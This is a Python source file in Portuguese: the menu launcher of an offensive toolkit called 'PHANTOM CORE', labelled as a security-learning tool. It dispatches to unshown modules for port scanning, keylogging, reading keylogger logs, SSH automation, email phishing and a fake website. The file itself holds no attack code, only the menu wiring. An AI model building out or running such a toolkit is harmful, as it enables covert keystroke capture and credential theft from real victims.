import os
import time
import sys
import subprocess
import socket
from colorama import init, Fore, Back, Style
import keylogger
import scan_ports
import leitor_log
import ssh_automation
import email_phish
from core import fake_site 
from core import fake_messages


# Inicializa colorama
init(autoreset=True)

def clear_screen():
    """Limpa a tela do terminal de forma multiplataforma"""
    os.system('cls' if os.name == 'nt' else 'clear')

def check_dependencies():
    """Verifica se todas as dependências estão instaladas"""
    required = {
        'pynput': 'pynput',
        'cryptography': 'cryptography',
        'paramiko': 'paramiko',
        'colorama': 'colorama',
        'pyfiglet': 'pyfiglet'
    }
    
    missing = []
    for package in required.values():
        try:
            __import__(package)
        except ImportError:
            missing.append(package)
    
    return missing

def install_dependencies():
    """Instala as dependências necessárias"""
    print(Fore.YELLOW + "\n[!] Verificando dependências...")
    missing = check_dependencies()
    
    if not missing:
        print(Fore.GREEN + "[+] Todas dependências já estão instaladas!")
        time.sleep(2)
        return True
    
    print(Fore.RED + f"\n[!] Dependências faltando: {', '.join(missing)}")
    choice = input(Fore.YELLOW + "\nDeseja instalar automaticamente? (s/n): ").lower()
    
    if choice == 's':
        print(Fore.CYAN + "\n[+] Instalando dependências...")
        try:
            subprocess.check_call([sys.executable, '-m', 'pip', 'install', '-r', 'requirements.txt'])
            print(Fore.GREEN + "\n[+] Dependências instaladas com sucesso!")
            time.sleep(2)
            return True
        except Exception as e:
            print(Fore.RED + f"\n[!] Falha na instalação: {str(e)}")
            input("\nPressione Enter para continuar...")
            return False
    else:
        print(Fore.YELLOW + "\n[!] Instalação cancelada pelo usuário")
        time.sleep(2)
        return False

def show_installer_menu():
    """Menu de instalação separado"""
    while True:
        clear_screen()
        print(Fore.CYAN + "\n" + " INSTALADOR ".center(60, '='))
        print(Fore.WHITE + "\nSelecione uma opção:\n")
        print(Fore.GREEN + "1. " + Fore.WHITE + "Verificar dependências")
        print(Fore.GREEN + "2. " + Fore.WHITE + "Instalar dependências")
        print(Fore.GREEN + "3. " + Fore.WHITE + "Voltar ao menu principal")
        print(Fore.CYAN + "\n" + "="*60)
        
        choice = input(Fore.YELLOW + "\nDigite sua opção (1-3): " + Fore.WHITE)
        
        if choice == '1':
            missing = check_dependencies()
            if missing:
                print(Fore.RED + f"\n[!] Dependências faltando: {', '.join(missing)}")
            else:
                print(Fore.GREEN + "\n[+] Todas dependências estão instaladas!")
            input("\nPressione Enter para continuar...")
            
        elif choice == '2':
            install_dependencies()
            
        elif choice == '3':
            break
            
        else:
            print(Fore.RED + "\n[!] Opção inválida")
            time.sleep(1)

def print_header():
    """Imprime o cabeçalho estilizado"""
    clear_screen()
    print(Fore.CYAN + r"""
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XX                                                                          XX
XX   MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM   XX
XX   MMMMMMMMMMMMMMMMMMMMMssssssssssssssssssssssssssMMMMMMMMMMMMMMMMMMMMM   XX
XX   MMMMMMMMMMMMMMMMss'''                          '''ssMMMMMMMMMMMMMMMM   XX
XX   MMMMMMMMMMMMyy''                                    ''yyMMMMMMMMMMMM   XX
XX   MMMMMMMMyy''                                            ''yyMMMMMMMM   XX
XX   MMMMMy''                                                    ''yMMMMM   XX
XX   MMMy'                                                          'yMMM   XX
XX   Mh'                                                              'hM   XX
XX   -                                                                  -   XX
XX                                                                          XX
XX   ::                                                                ::   XX
XX   MMhh.        ..hhhhhh..                      ..hhhhhh..        .hhMM   XX
XX   MMMMMh   ..hhMMMMMMMMMMhh.                .hhMMMMMMMMMMhh..   hMMMMM   XX
XX   ---MMM .hMMMMdd:::dMMMMMMMhh..        ..hhMMMMMMMd:::ddMMMMh. MMM---   XX
XX   MMMMMM MMmm''      'mmMMMMMMMMyy.  .yyMMMMMMMMmm'      ''mmMM MMMMMM   XX
XX   ---mMM ''             'mmMMMMMMMM  MMMMMMMMmm'             '' MMm---   XX
XX   yyyym'    .              'mMMMMm'  'mMMMMm'              .    'myyyy   XX
XX   mm''    .y'     ..yyyyy..  ''''      ''''  ..yyyyy..     'y.    ''mm   XX
XX           MN    .sMMMMMMMMMss.   .    .   .ssMMMMMMMMMs.    NM           XX
XX           N`    MMMMMMMMMMMMMN   M    M   NMMMMMMMMMMMMM    `N           XX
XX            +  .sMNNNNNMMMMMN+   `N    N`   +NMMMMMNNNNNMs.  +            XX
XX              o+++     ++++Mo    M      M    oM++++     +++o              XX
XX                                oo      oo                                XX
XX           oM                 oo          oo                 Mo           XX
XX         oMMo                M              M                oMMo         XX
XX       +MMMM                 s              s                 MMMM+       XX
XX      +MMMMM+            +++NNNN+        +NNNN+++            +MMMMM+      XX
XX     +MMMMMMM+       ++NNMMMMMMMMN+    +NMMMMMMMMNN++       +MMMMMMM+     XX
XX     MMMMMMMMMNN+++NNMMMMMMMMMMMMMMNNNNMMMMMMMMMMMMMMNN+++NNMMMMMMMMM     XX
XX     yMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMy     XX
XX   m  yMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMy  m   XX
XX   MMm yMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMy mMM   XX
XX   MMMm .yyMMMMMMMMMMMMMMMM     MMMMMMMMMM     MMMMMMMMMMMMMMMMyy. mMMM   XX
XX   MMMMd   ''''hhhhh       odddo          obbbo        hhhh''''   dMMMM   XX
XX   MMMMMd             'hMMMMMMMMMMddddddMMMMMMMMMMh'             dMMMMM   XX
XX   MMMMMMd              'hMMMMMMMMMMMMMMMMMMMMMMh'              dMMMMMM   XX
XX   MMMMMMM-               ''ddMMMMMMMMMMMMMMdd''               -MMMMMMM   XX
XX   MMMMMMMM                   '::dddddddd::'                   MMMMMMMM   XX
XX   MMMMMMMM-                                                  -MMMMMMMM   XX
XX   MMMMMMMMM                                                  MMMMMMMMM   XX
XX   MMMMMMMMMy                                                yMMMMMMMMM   XX
XX   MMMMMMMMMMy.                                            .yMMMMMMMMMM   XX
XX   MMMMMMMMMMMMy.                                        .yMMMMMMMMMMMM   XX
XX   MMMMMMMMMMMMMMy.                                    .yMMMMMMMMMMMMMM   XX
XX   MMMMMMMMMMMMMMMMs.                                .sMMMMMMMMMMMMMMMM   XX
XX   MMMMMMMMMMMMMMMMMMss.           ....           .ssMMMMMMMMMMMMMMMMMM   XX
XX   MMMMMMMMMMMMMMMMMMMMNo         oNNNNo         oNMMMMMMMMMMMMMMMMMMMM   XX
XX                                                                          XX
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX

  ____  _____ ____  _   _ _   _ ______   _    _   _ _____ ____  
 PHANTOM CORE v2.0
⊛ Invisible Operations Core ⊛
    BY S1nn3r
    """)
    print(Fore.YELLOW + "="*60)
    print(Fore.GREEN + "nada é real, tudo é permitido".center(60))
    print(Fore.YELLOW + "="*60)
    print(Fore.WHITE + "Projeto criado por S1nn3r".center(60))
    print("Ferramenta para aprendizado em segurança da informação".center(60))
    print(Fore.YELLOW + "="*60 + "\n")

def print_menu():
    """Imprime as opções do menu de forma profissional"""
    print(Fore.BLUE + "\n" + " MENU PRINCIPAL ".center(60, '='))
    print(Fore.WHITE + "\nSelecione uma operação:\n")
    print(Fore.GREEN + "0. " + Fore.WHITE + "Instalar dependências")
    print(Fore.GREEN + "1. " + Fore.WHITE + "Verificar portas de um host")
    print(Fore.GREEN + "2. " + Fore.WHITE + "Iniciar Keylogger")
    print(Fore.GREEN + "3. " + Fore.WHITE + "Ler logs do Keylogger")
    print(Fore.GREEN + "4. " + Fore.WHITE + "Automação SSH")
    print(Fore.GREEN + "5. " + Fore.WHITE + "Phishing via Email")
    print(Fore.GREEN + "6. " + Fore.WHITE + "Iniciar Fake Site")
    print(Fore.GREEN + "7. " + Fore.WHITE + "Sair do programa")
    print(Fore.BLUE + "\n" + "="*60 + "\n")

def get_choice():
    """Obtém a escolha do usuário com tratamento de erros"""
    while True:
        try:
            choice = input(Fore.YELLOW + "\nDigite sua opção (0-7): " + Fore.WHITE)
            if choice in ['0', '1', '2', '3', '4', '5', '6', '7', '8']:
                return choice
            print(Fore.RED + "\n[ERRO] Opção inválida. Digite um número entre 0 e 8.")
        except KeyboardInterrupt:
            print(Fore.RED + "\n\nOperação cancelada pelo usuário.")
            return '5'

def main():
    # Verifica dependências ao iniciar
    missing = check_dependencies()
    if missing:
        print(Fore.RED + f"\n[!] Atenção: Dependências faltando: {', '.join(missing)}")
        print(Fore.YELLOW + "Recomendado executar a opção de instalação primeiro\n")
        time.sleep(3)
    
    while True:
        print_header()
        print_menu()
        choice = get_choice()

        if choice == '0':
            show_installer_menu()
            
        elif choice == '1':
            clear_screen()
            print_header()
            print(Fore.CYAN + "\n" + " VERIFICAÇÃO DE PORTAS ".center(60, '=') + "\n")
            scan_ports.scan()
            input(Fore.YELLOW + "\nPressione Enter para continuar...")

        elif choice == '2':
            clear_screen()
            print_header()
            print(Fore.CYAN + "\n" + " KEYLOGGER ".center(60, '=') + "\n")
            try:
                keylogger.iniciar_keylogger()
            except Exception as e:
                print(Fore.RED + f"\n[ERRO] O keylogger encontrou um problema: {e}")
                input(Fore.YELLOW + "\nPressione Enter para continuar...")

        elif choice == '3':
            clear_screen()
            print_header()
            print(Fore.CYAN + "\n" + " LOGS DO KEYLOGGER ".center(60, '=') + "\n")
            leitor_log.ler_log()
            input(Fore.YELLOW + "\nPressione Enter para continuar...")

        elif choice == '4':
            clear_screen()
            print_header()
            print(Fore.CYAN + "\n" + " AUTOMAÇÃO SSH ".center(60, '=') + "\n")
            ssh_automation.ssh_menu()

        elif choice == '5':  # Nova opção de phishing
            clear_screen()
            print_header()
            print(Fore.CYAN + "\n" + " PHANTOM MAIL ".center(60, '=') + "\n")
            email_phish.show_phishing_menu()

        elif choice == '6':
            clear_screen()
            print_header()
            print(Fore.CYAN + "\n" + " INICIANDO O FAKE SITE ".center(60, '=') + "\n")
            print(Fore.YELLOW + "[!] Certifique-se de que o servidor Flask está instalado.")
            fake_site.start_server()
            input("\nPressione Enter para continuar...")
            


        elif choice == '7':
            clear_screen()
            print_header()
            print(Fore.RED + "\n" + " ENCERRANDO O PROGRAMA ".center(60, '=') + "\n")
            print(Fore.YELLOW + "\nObrigado por utilizar a ferramenta!")
            time.sleep(2)
            break

if __name__ == "__main__":
    main()